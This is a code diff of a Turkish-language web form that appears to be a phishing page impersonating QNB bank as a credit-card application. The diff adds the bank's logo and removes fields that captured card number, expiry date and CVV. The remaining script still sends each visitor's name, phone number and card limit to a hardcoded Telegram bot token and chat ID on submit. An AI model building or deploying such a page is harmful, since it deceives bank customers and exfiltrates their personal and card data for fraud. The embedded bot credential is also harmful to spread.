@@ -22,6 +22,10 @@
       flex: 1;
       justify-content: center;
     }
+    .logo {
+      width: 120px;
+      margin-bottom: 20px;
+    }
     .card {
       background: rgba(255, 255, 255, 0.05);
       padding: 30px;
@@ -60,21 +64,6 @@
       cursor: pointer;
       margin-top: 10px;
     }
-    .button-row {
-      display: flex;
-      gap: 10px;
-      justify-content: center;
-    }
-    .button-row button {
-      flex: 1;
-      padding: 12px;
-      background: transparent;
-      border: 2px solid white;
-      border-radius: 10px;
-      color: white;
-      font-weight: bold;
-      cursor: pointer;
-    }
     .checkmark {
       font-size: 48px;
       color: #00cc66;
@@ -98,6 +87,9 @@
 </head>
 <body>
   <div class="container">
+    <!-- LOGO -->
+    <img src="logo.png" alt="QNB Logo" class="logo" />
+
     <!-- ADIM 1 -->
     <div class="card active" id="formCard">
       <h2>Bilgilerinizi Giriniz</h2>
@@ -109,57 +101,21 @@
         <label for="phone">Telefon *</label>
         <input type="tel" id="phone" required />
       </div>
-      <button class="submit-btn" onclick="goToCardQuestion()">DEVAM</button>
+      <div class="form-group">
+        <label for="limit">Kredi Kartı Limitiniz *</label>
+        <input type="text" id="limit" placeholder="Örn: 50000 ₺" required />
+      </div>
+      <button class="submit-btn" onclick="showSuccess()">DEVAM</button>
     </div>
 
-    <!-- ADIM 2 -->
-    <div class="card" id="cardQuestion">
-      <h2>Kredi Kartınız Var mı?</h2>
-      <div class="button-row">
-        <button onclick="goToLimitPage()">Evet</button>
-        <button onclick="finishWithoutCard()">Hayır</button>
-      </div>
-    </div>
-
-    <!-- ADIM 3 -->
-    <div class="card" id="limitCard">
-      <h2>Kart Limitinizi Giriniz</h2>
-      <div class="form-group">
-        <label for="limit">Kart Limiti *</label>
-        <input type="text" id="limit" placeholder="100000 ₺" required />
-      </div>
-      <button class="submit-btn" onclick="goToCardDetails()">DEVAM</button>
-    </div>
-
-    <!-- ADIM 4 -->
-    <div class="card" id="cardDetails">
-      <h2>Kart Bilgilerinizi Giriniz</h2>
-      <div class="form-group">
-        <label for="cardNumber">Kart Numarası *</label>
-        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" oninput="formatCardNumber(this)" />
-      </div>
-      <div class="form-group">
-        <label for="expiry">Son Kullanma Tarihi *</label>
-        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" oninput="formatExpiry(this)" />
-      </div>
-      <div class="form-group">
-        <label for="cvv">CVV *</label>
-        <input type="text" id="cvv" placeholder="123" maxlength="3" oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
-      </div>
-      <button class="submit-btn" onclick="showSuccess()">BAŞVURUYU TAMAMLA</button>
-    </div>
-
-    <!-- ADIM 5 -->
+    <!-- BAŞVURU TAMAMLANDI -->
     <div class="card" id="successCard">
       <div class="checkmark">✔️</div>
-      <h2>Başvurunuz Alındı</h2>
+      <h2>Başvurunuz Alındı<br/>Müşteri Temsilcimiz Sizi Arayacaktır</h2>
       <div class="summary-box">
         <p><strong>Ad Soyad:</strong> <span id="summaryName"></span></p>
         <p><strong>Telefon:</strong> <span id="summaryPhone"></span></p>
         <p><strong>Kart Limiti:</strong> <span id="summaryLimit"></span></p>
-        <p><strong>Kart No:</strong> <span id="summaryCard"></span></p>
-        <p><strong>Son Kullanma:</strong> <span id="summaryExpiry"></span></p>
-        <p><strong>CVV:</strong> <span id="summaryCVV"></span></p>
         <p><strong>Başvuru Tarihi:</strong> <span id="summaryDate"></span></p>
       </div>
       <button class="submit-btn" onclick="location.reload()">Yeniden Başla</button>
@@ -172,24 +128,6 @@
       document.getElementById(id).classList.add('active');
     }
 
-    function goToCardQuestion() {
-      showCard("cardQuestion");
-    }
-
-    function goToLimitPage() {
-      showCard("limitCard");
-    }
-
-    function goToCardDetails() {
-      showCard("cardDetails");
-    }
-
-    function finishWithoutCard() {
-      alert("Kredi kartı bilginiz alınmadı.");
-      fillSummary();
-      showCard("successCard");
-    }
-
     function showSuccess() {
       fillSummary();
       sendToTelegram();
@@ -200,37 +138,17 @@
       document.getElementById("summaryName").innerText = document.getElementById("name").value;
       document.getElementById("summaryPhone").innerText = document.getElementById("phone").value;
       document.getElementById("summaryLimit").innerText = document.getElementById("limit").value;
-      document.getElementById("summaryCard").innerText = document.getElementById("cardNumber").value;
-      document.getElementById("summaryExpiry").innerText = document.getElementById("expiry").value;
-      document.getElementById("summaryCVV").innerText = document.getElementById("cvv").value;
       document.getElementById("summaryDate").innerText = new Date().toLocaleString('tr-TR');
     }
 
-    function formatCardNumber(input) {
-      let value = input.value.replace(/\D/g, '').substring(0,16);
-      input.value = value.replace(/(.{4})/g, '$1 ').trim();
-    }
-
-    function formatExpiry(input) {
-      let value = input.value.replace(/[^0-9]/g, '').substring(0, 4);
-      if (value.length >= 3) {
-        input.value = value.substring(0, 2) + '/' + value.substring(2);
-      } else {
-        input.value = value;
-      }
-    }
-
     async function sendToTelegram() {
-      const token = "7899149800:AAEUrSio-NfOHcCsvZRsNwBhQrp_lBCcY4c";
+      const token = "7899149800:AAEUrSio-NfOHcCsvZRsNwBhQrp_lBCcY4c"; // GÜVENLİK: Gerçek projelerde token sunucu tarafında saklanmalıdır
       const chat_id = "8045620328";
       const message = 
         "📩 *Yeni Başvuru*\n\n" +
         "👤 Ad Soyad: " + document.getElementById("name").value + "\n" +
         "📞 Telefon: " + document.getElementById("phone").value + "\n" +
         "💳 Kart Limiti: " + document.getElementById("limit").value + "\n" +
-        "🔢 Kart No: " + document.getElementById("cardNumber").value + "\n" +
-        "📆 Son Kullanma: " + document.getElementById("expiry").value + "\n" +
-        "🔐 CVV: " + document.getElementById("cvv").value + "\n" +
         "📅 Tarih: " + new Date().toLocaleString('tr-TR');
 
       const url = `https://api.telegram.org/bot${token}/sendMessage`;
